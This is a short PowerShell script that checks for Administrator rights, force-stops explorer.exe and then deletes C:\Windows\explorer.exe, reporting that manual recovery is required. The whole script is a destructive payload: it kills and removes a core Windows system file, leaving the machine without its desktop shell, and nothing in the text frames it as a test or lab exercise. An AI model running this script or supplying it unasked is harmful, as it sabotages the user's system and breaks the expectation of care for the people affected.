# Ensure the script is running as Administrator
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Output "This script must be run as an Administrator!"
    exit
}

# Path to explorer.exe
$explorerPath = "C:\Windows\explorer.exe"

# Terminate explorer.exe if running
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue

# Delete explorer.exe
if (Test-Path $explorerPath) {
    Remove-Item -Path $explorerPath -Force
    Write-Output "explorer.exe has been deleted. Manual recovery is required."
} else {
    Write-Output "explorer.exe not found or already deleted."
}
